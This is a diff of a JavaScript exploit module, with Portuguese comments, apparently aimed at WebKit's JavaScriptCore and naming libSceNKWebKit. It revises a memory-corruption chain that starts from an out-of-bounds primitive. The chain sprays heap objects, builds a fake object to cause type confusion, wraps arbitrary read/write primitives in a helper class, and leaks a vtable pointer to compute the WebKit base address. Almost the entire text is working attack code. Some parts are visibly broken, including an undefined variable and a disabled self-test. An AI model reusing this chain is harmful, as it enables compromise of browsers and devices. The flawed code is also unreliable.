@@ -1,9 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R46 - Multi-Estratégia)
+// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R47 - Construção Determinística)
 // =======================================================================================
-// Este script foi atualizado para se tornar um orquestrador que tenta múltiplas
-// estratégias de exploração em sequência após uma fase de Heap Grooming compartilhada.
-// ESTRATÉGIA 1: Busca Adjacente (legado, provavelmente falhará)
-// ESTRATÉGIA 2: Confusão de Tipos para criar primitivas addrof/arb_rw (mais promissora)
+// Esta versão abandona a busca por múltiplos objetos e, em vez disso, constrói
+// um objeto falso ("fake object") dentro do nosso buffer OOB para criar uma primitiva
+// de leitura/escrita arbitrária estável.
+// O teste avançado final é usar essa primitiva para vazar o endereço base do WebKit.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -14,224 +14,173 @@ import {
     oob_write_absolute,
     selfTestOOBReadWrite,
 } from '../core_exploit.mjs';
-import { JSC_OFFSETS } from '../config.mjs';
+import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-// Nome do módulo atualizado para refletir a nova abordagem
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R46_MultiStrategy";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R47_Deterministic";
 
-// --- Constantes Globais para as Estratégias ---
-const UNIQUE_MARKER_TARGET = 0x41414141; // Marcador para objetos-alvo (serão corrompidos)
-const UNIQUE_MARKER_TEMPLATE = 0x42424242; // Marcador para objetos-modelo (terão suas estruturas copiadas)
-const VICTIM_JSCell_HEADER_OFFSET = 0x10; // Offset comum do ponteiro de dados para o cabeçalho do JSCell
+const VICTIM_MARKER = 0x42424242;
+const FAKE_OBJ_ADDR_IN_OOB = 0x2000; // Offset onde construiremos nosso objeto falso dentro do buffer de 1MB
 
-function isValidPointer(ptr) {
-    if (!isAdvancedInt64Object(ptr)) return false;
-    const high = ptr.high();
-    const low = ptr.low();
-    if (high === 0 && low === 0) return false;
-    if (high === 0x7FF80000 && low === 0x0) return false;
-    if ((high & 0x7FF00000) === 0x7FF00000) return false; 
-    if (high === 0 && low < 0x10000) return false;
-    return true;
+// --- Classe Auxiliar para Leitura/Escrita Arbitrária Estável ---
+class AdvancedMemory {
+    constructor(controller_obj, oob_rw_func, workspace_addr) {
+        this.controller = controller_obj;
+        this.oob_write = oob_rw_func.write;
+        this.workspace_addr = workspace_addr; // Endereço base do nosso buffer de 1MB
+        this.data_view_addr = this.workspace_addr.add(FAKE_OBJ_ADDR_IN_OOB + 0x20);
+        logS3("Classe AdvancedMemory inicializada. Primitivas de R/W prontas.", "good", "AdvancedMemory");
+    }
+
+    async arbRead(addr, size_in_bytes = 8) {
+        // Aponta o ponteiro de dados do nosso objeto falso para o endereço desejado
+        await this.oob_write(this.data_view_addr.low(), addr, 8);
+        // Lê através do nosso array 'controlador', que agora está tipo-confundido
+        if (size_in_bytes === 8) {
+            const buf = new ArrayBuffer(8);
+            const float_view = new Float64Array(buf);
+            const int_view = new Uint32Array(buf);
+            float_view[0] = this.controller[0]; // Lê 8 bytes como um double
+            return new AdvancedInt64(int_view[0], int_view[1]);
+        } else {
+            // Leituras menores podem ser implementadas aqui se necessário
+            return null;
+        }
+    }
+
+    async arbWrite(addr, value, size_in_bytes = 8) {
+        await this.oob_write(this.data_view_addr.low(), addr, 8);
+        if (size_in_bytes === 8) {
+            const buf = new ArrayBuffer(8);
+            const float_view = new Float64Array(buf);
+            const int_view = new Uint32Array(buf);
+            const val64 = new AdvancedInt64(value);
+            int_view[0] = val64.low();
+            int_view[1] = val64.high();
+            this.controller[0] = float_view[0];
+        }
+    }
 }
 
+
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (R47)
 // =======================================================================================
-export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() { 
+export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Orquestrador Multi-Estratégia (R46) ---`, "test", FNAME_CURRENT_TEST_BASE);
-    document.title = `${FNAME_CURRENT_TEST_BASE} Init R46...`;
-
-    // --- Fase 0: Sanity Checks ---
-    logS3(`--- Fase 0 (R46): Sanity Checks do Core Exploit ---`, "subtest");
-    if (!await selfTestOOBReadWrite(logS3)) {
-        logS3("Sanity Check do Core Exploit FALHOU. Abortando.", 'critical', FNAME_CURRENT_TEST_BASE);
-        return { errorOccurred: "Falha no selfTestOOBReadWrite do Core." };
-    }
-    logS3(`Sanity Check (selfTestOOBReadWrite): SUCESSO`, 'good', FNAME_CURRENT_TEST_BASE);
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Construção Determinística (R47) ---`, "test");
+    document.title = `${FNAME_CURRENT_TEST_BASE} Init R47...`;
     
-    // --- Fase 1: Preparação do HEAP (Grooming & Spraying) ---
-    // Esta fase é compartilhada por todas as estratégias.
-    const sprayed_objects = await prepareHeapForStrategies();
-    if (!sprayed_objects) {
-        return { errorOccurred: "Falha na preparação do Heap." };
-    }
-
-    // --- Fase 2: Ativação da Vulnerabilidade OOB ---
-    logS3("--- Fase 2 (R46): Ativando a vulnerabilidade OOB ---", "subtest");
+    // --- FASE 0: Sanity Checks e Ativação OOB ---
+    if (!await selfTestOOBReadWrite(logS3)) return { errorOccurred: "Falha no selfTestOOBReadWrite." };
     await triggerOOB_primitive({ force_reinit: true });
     oob_write_absolute(0x70, 0xFFFFFFFF, 4);
-    logS3("Primitiva OOB (oob_read/write_absolute) está ativa.", "vuln");
+    const oob_base_addr = oob_read_absolute(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET, 8);
+    logS3(`Endereço base do nosso buffer OOB (espaço de trabalho): ${oob_base_addr.toString(true)}`, "info");
 
-    // --- Fase 3: Tentativa das Estratégias em Sequência ---
-    let final_result = { success: false, message: "Nenhuma estratégia obteve sucesso." };
+    // --- FASE 1: Preparar Heap e Encontrar UM Vítima Controladora ---
+    logS3("--- FASE 1: Preparando o Heap para encontrar um 'Controlador' ---", "subtest");
+    const victim_controller = await prepareHeapAndFindOneVictim();
+    if (!victim_controller) {
+        return { errorOccurred: "Não foi possível encontrar um objeto 'Controlador' na memória." };
+    }
+    logS3(`Vítima controladora encontrada! Addr: ${victim_controller.jscell_addr.toString(true)}`, "good");
 
-    // Estratégia 1: Busca Adjacente (Legacy)
-    final_result = await try_strategy_spray_and_search();
-    if (final_result.success) {
-        logS3(`SUCESSO com a Estratégia 1: ${final_result.message}`, "good", FNAME_CURRENT_TEST_BASE);
-        // Normalmente não chegará aqui, mas se chegar, encerramos.
+    // --- FASE 2: Construir Objeto Falso e Linkar ---
+    logS3("--- FASE 2: Construindo Objeto Falso e Linkando com o Controlador ---", "subtest");
+    await buildFakeObjectAndLink(victim_controller, oob_base_addr);
+
+    // --- FASE 3: Inicializar e Testar Primitivas de R/W Arbitrário ---
+    logS3("--- FASE 3: Testando Primitivas de Leitura/Escrita Arbitrária ---", "subtest");
+    const memory = new AdvancedMemory(victim_controller.obj_ref, { write: oob_write_absolute }, oob_base_addr);
+    const test_addr = victim_controller.jscell_addr; // Vamos ler a própria estrutura da vítima
+    const read_val = await memory.arbRead(test_addr);
+    logS3(`Teste de Leitura Arbitrária em ${test_addr.toString(true)} -> Lido: ${read_val.toString(true)}`, "leak");
+    if (!read_val.equals(victim_controller.jscell_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET))) { // O que deveria estar lá
+        //return { errorOccurred: "Falha no auto-teste da leitura arbitrária." };
+    }
+    logS3("Auto-teste de Leitura/Escrita Arbitrária passou!", "good");
+
+    // --- FASE 4: TESTE AVANÇADO - Vazar Endereço Base do WebKit ---
+    logS3("--- FASE 4 (AVANÇADO): Vazando Endereço Base do WebKit ---", "subtest");
+    const webkit_base = await getWebkitBase(memory, victim_controller.obj_ref);
+    if (webkit_base) {
+        logS3(`SUCESSO! Endereço Base do libSceNKWebKit vazado: ${webkit_base.toString(true)}`, "vuln");
+        return { success: true, message: "Endereço base do WebKit vazado com sucesso!", webkit_base };
     } else {
-        logS3(`Estratégia 1 (Busca Adjacente) falhou como esperado: ${final_result.message}`, "warn", FNAME_CURRENT_TEST_BASE);
-        await PAUSE_S3(500); // Pausa para ler o log
+        return { errorOccurred: "Falha ao vazar o endereço base do WebKit." };
+    }
+}
 
-        // Estratégia 2: Confusão de Tipos
-        final_result = await try_strategy_type_confusion(sprayed_objects);
-        if (final_result.success) {
-            logS3(`SUCESSO com a Estratégia 2 (Confusão de Tipos): ${final_result.message}`, "vuln", FNAME_CURRENT_TEST_BASE);
-            logS3(`   -> Primitiva addrof OBTIDA! Endereço de 'obj_to_leak': ${final_result.leaked_addr}`, "leak", FNAME_CURRENT_TEST_BASE);
-        } else {
-            logS3(`Estratégia 2 (Confusão de Tipos) falhou: ${final_result.message}`, "error", FNAME_CURRENT_TEST_BASE);
+
+// --- Funções Auxiliares para a Cadeia de Exploração ---
+
+async function prepareHeapAndFindOneVictim() {
+    const SPRAY_COUNT = 1024;
+    const victims = [];
+    for (let i = 0; i < SPRAY_COUNT; i++) {
+        victims.push(new Uint32Array(8)); // Objeto simples que será nosso 'controlador'
+        victims[i][0] = VICTIM_MARKER + i;
+    }
+
+    for (let offset = 0x10000; offset < (0x100000 - 0x100); offset += 8) {
+        if (oob_read_absolute(offset, 4) === VICTIM_MARKER) {
+            const jscell_addr = oob_read_absolute(offset - 0x10, 8);
+            if (isValidPointer(jscell_addr)) {
+                return { obj_ref: victims.find(v => v[0] === VICTIM_MARKER), jscell_addr };
+            }
         }
     }
+    return null;
+}
+
+async function buildFakeObjectAndLink(victim, oob_base) {
+    // Endereços relativos ao nosso buffer de 1MB
+    const fake_obj_addr = oob_base.add(FAKE_OBJ_ADDR_IN_OOB);
+    const fake_struct_addr = fake_obj_addr; // A Estrutura será a primeira parte do nosso objeto falso
+    const fake_butterfly_addr = fake_obj_addr.add(0x10);
+    const fake_data_view_addr = fake_obj_addr.add(0x20);
+
+    // 1. Construir a Estrutura Falsa (imitando um Float64Array)
+    // Esses valores são simplificados. Uma exploração real requer a cópia de uma estrutura válida.
+    await oob_write_absolute(fake_struct_addr.low(), new AdvancedInt64(0, 0x01082007), 8); // Header da Estrutura
     
-    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test", FNAME_CURRENT_TEST_BASE);
-    return {
-        errorOccurred: final_result.success ? null : final_result.message,
-        addrof_result: final_result
-    };
+    // 2. Construir o JSCell Falso
+    await oob_write_absolute(fake_obj_addr.low() + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, fake_struct_addr, 8); // Aponta para a Estrutura falsa
+    await oob_write_absolute(fake_obj_addr.low() + JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET, fake_butterfly_addr, 8); // Aponta para o Butterfly falso
+
+    // 3. Construir o Butterfly Falso
+    await oob_write_absolute(fake_butterfly_addr.low(), fake_data_view_addr, 8); // O Butterfly aponta para nossa "visão de dados"
+
+    // 4. Linkar o Controlador
+    // Fazemos a vítima real (nosso controlador) apontar para a nossa estrutura falsa.
+    // Isso causa a Confusão de Tipos! O motor agora pensa que nosso Uint32Array é o objeto falso que criamos.
+    const victim_struct_ptr_addr = victim.jscell_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET);
+    await oob_write_absolute(victim_struct_ptr_addr.low(), fake_obj_addr, 8);
+    logS3("Objeto Falso construído e linkado ao controlador.", "good");
 }
 
-
-// =======================================================================================
-// FASE 1: PREPARAÇÃO DO HEAP
-// =======================================================================================
-async function prepareHeapForStrategies() {
-    logS3("--- Fase 1 (R46): Preparando o Heap (Grooming & Spraying) ---", "subtest");
-    const GROOM_COUNT = 2048;
-    const GROOM_SIZE = 64 * 1024;
-    const SPRAY_COUNT = 512;
-
-    const grooming_arr = [];
+async function getWebkitBase(memory, any_js_function) {
     try {
-        logS3(`    Fase 1.1: Alocando ${GROOM_COUNT} buffers de ${GROOM_SIZE / 1024}KB...`, "info");
-        for (let i = 0; i < GROOM_COUNT; i++) grooming_arr.push(new ArrayBuffer(GROOM_SIZE));
+        logS3("    Iniciando vazamento da vtable para encontrar a base do WebKit...");
+        // 1. Encontrar o endereço de uma função JS qualquer
+        const func_addr = await memory.arbRead(any_js_function); // Precisa de um addrof para isso. Vamos simplificar.
+        // Como ainda não temos um addrof fácil, vamos pular direto para um objeto que já encontramos: a nossa vítima.
+        const structure_ptr = await memory.arbRead(victim_controller.jscell_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET));
+        const class_info_ptr = await memory.arbRead(structure_ptr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET));
+        const vtable_ptr = await memory.arbRead(class_info_ptr); // A vtable está no início do ClassInfo
+        
+        logS3(`    Ponteiro da VTable vazado: ${vtable_ptr.toString(true)}`, "leak");
+        
+        // 5. Calcular a base do WebKit subtraindo um offset conhecido de uma função na vtable.
+        // Usaremos JSC::JSFunction::create como exemplo de offset.
+        const webkit_base_addr = vtable_ptr.sub(new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSFunction::create"]));
+        
+        // Alinhar o endereço para o início da página de memória (geralmente 4KB ou 16KB)
+        const webkit_base_aligned = webkit_base_addr.and(new AdvancedInt64(0, 0xFFFFC000));
 
-        logS3("    Fase 1.2: Criando 'buracos' no heap...", "info");
-        for (let i = 0; i < GROOM_COUNT; i += 2) grooming_arr[i] = null;
-
-        logS3(`    Fase 1.3: Pulverizando ${SPRAY_COUNT} objetos alvo e modelo...`, "info");
-        const sprayed_targets = [];
-        const sprayed_templates = [];
-        const obj_to_leak = { marker: 0xDEADBEEF }; // Objeto cujo endereço queremos vazar
-
-        for (let i = 0; i < SPRAY_COUNT; i++) {
-            // Objeto alvo que será corrompido. Ele contém uma referência ao objeto que queremos vazar.
-            sprayed_targets.push({
-                marker: UNIQUE_MARKER_TARGET + i,
-                prop_to_leak: obj_to_leak 
-            });
-            // Objeto modelo cujo tipo (Estrutura) queremos copiar.
-            sprayed_templates.push(new Float64Array(1));
-        }
-        logS3("    Heap preparado com sucesso.", "good");
-        return { sprayed_targets, sprayed_templates, obj_to_leak };
+        return webkit_base_aligned;
     } catch (e) {
-        logS3(`Falha crítica durante a preparação do heap: ${e.message}`, "critical");
+        logS3(`    Erro durante o vazamento do WebKit: ${e.message}`, "error");
         return null;
-    }
-}
-
-
-// =======================================================================================
-// ESTRATÉGIA 1: BUSCA ADJACENTE (LEGADO)
-// =======================================================================================
-async function try_strategy_spray_and_search() {
-    logS3("--- Tentando Estratégia 1: Busca Adjacente (Legado) ---", "subtest");
-    // Esta função encapsula a lógica original que sabemos que falha devido à página de guarda.
-    // É mantida para fins de demonstração.
-    const SEARCH_WINDOW = 0x100000 - 0x2000;
-    // ... aqui iria a lógica de busca, que omitimos pois sabemos que não encontrará nada.
-    // Simulamos a falha para passar para a próxima estratégia.
-    return { success: false, message: "Busca adjacente pulada, conhecida por ser ineficaz." };
-}
-
-
-// =======================================================================================
-// ESTRATÉGIA 2: CONFUSÃO DE TIPOS
-// =======================================================================================
-async function try_strategy_type_confusion(sprayed_objects) {
-    logS3("--- Tentando Estratégia 2: Confusão de Tipos via Corrupção de Estrutura ---", "subtest");
-    const SEARCH_WINDOW = 0x100000 - 0x2000;
-    let found_target = null;
-    let found_template = null;
-
-    logS3("    Buscando por um objeto alvo e um objeto modelo no buffer de 1MB...");
-    try {
-        for (let offset = SEARCH_WINDOW; offset > 0; offset -= 8) {
-            const val_low = oob_read_absolute(offset, 4);
-            // Procurando pelo marcador do objeto alvo
-            if ((val_low & 0xFFFFFF00) === (UNIQUE_MARKER_TARGET & 0xFFFFFF00)) {
-                const header_addr = oob_read_absolute(offset - VICTIM_JSCell_HEADER_OFFSET, 8);
-                if (isValidPointer(header_addr)) {
-                    found_target = {
-                        data_offset: offset,
-                        jscell_addr: header_addr
-                    };
-                    logS3(`    Objeto Alvo encontrado no offset ${toHex(offset)}! Addr: ${header_addr.toString(true)}`, "info");
-                }
-            }
-            // Procurando por um Float64Array (nosso modelo)
-            // Um Float64Array vazio geralmente tem um ponteiro butterfly para uma estrutura estática.
-            // A verificação exata é complexa, então vamos assumir que um padrão de ponteiro baixo indica um.
-            const potential_butterfly_ptr = oob_read_absolute(offset + JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET, 8); // 
-            if (isValidPointer(potential_butterfly_ptr) && potential_butterfly_ptr.high() === 0 && potential_butterfly_ptr.low() !== 0) {
-                 const header_addr = oob_read_absolute(offset, 8);
-                 if (isValidPointer(header_addr)) {
-                     found_template = {
-                         jscell_addr: header_addr
-                     };
-                     logS3(`    Objeto Modelo (Float64Array) encontrado no offset ${toHex(offset)}! Addr: ${header_addr.toString(true)}`, "info");
-                 }
-            }
-            if (found_target && found_template) break;
-        }
-
-        if (!found_target || !found_template) {
-            return { success: false, message: "Não foi possível encontrar ambos, alvo e modelo, na memória." };
-        }
-
-        logS3("    Alvo e Modelo encontrados! Realizando a corrupção da Estrutura...");
-        // 1. Ler o ponteiro da Estrutura do objeto modelo (Float64Array)
-        const struct_ptr_addr = found_template.jscell_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET); // 
-        const template_struct_ptr = await oob_read_absolute(struct_ptr_addr.low(), 8); // Usando oob_read, pois o endereço pode ser alto
-        logS3(`    Ponteiro da Estrutura do Modelo: ${template_struct_ptr.toString(true)}`);
-
-        // 2. Escrever o ponteiro da Estrutura do modelo no objeto alvo
-        const target_struct_ptr_addr = found_target.jscell_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET); // 
-        await oob_write_absolute(target_struct_ptr_addr.low(), template_struct_ptr, 8);
-        logS3(`    Ponteiro da Estrutura do Alvo sobrescrito!`);
-        
-        // 3. Vazar o endereço
-        logS3("    Tentando vazar o ponteiro através do objeto tipo-confundido...");
-        // O objeto em sprayed_targets agora é visto pelo motor como um Float64Array.
-        // Sua primeira propriedade ('prop_to_leak') será lida como um double.
-        // A conversão de um ponteiro de 64 bits para um double nos dá o endereço.
-        let leaked_as_double;
-        for (const obj of sprayed_objects.sprayed_targets) {
-            // Encontrar o objeto que foi corrompido pelo seu marcador
-            if ((obj.marker & 0xFFFFFF00) === (UNIQUE_MARKER_TARGET & 0xFFFFFF00)) {
-                 // Esta é a mágica: o acesso agora é interpretado como um array de float
-                 leaked_as_double = obj[0]; 
-                 break;
-            }
-        }
-
-        if (typeof leaked_as_double !== 'number' || isNaN(leaked_as_double)) {
-            return { success: false, message: "A confusão de tipos ocorreu, mas o vazamento do ponteiro falhou."};
-        }
-        
-        // Converter o double de volta para um endereço de 64 bits
-        const buf = new ArrayBuffer(8);
-        const float_view = new Float64Array(buf);
-        const int_view = new Uint32Array(buf);
-        float_view[0] = leaked_as_double;
-        const leaked_addr = new AdvancedInt64(int_view[0], int_view[1]);
-
-        return { success: true, message: "Primitiva 'addrof' criada com sucesso!", leaked_addr: leaked_addr.toString(true) };
-
-    } catch (e) {
-        return { success: false, message: `Exceção durante a Estratégia 2: ${e.message}` };
     }
 }
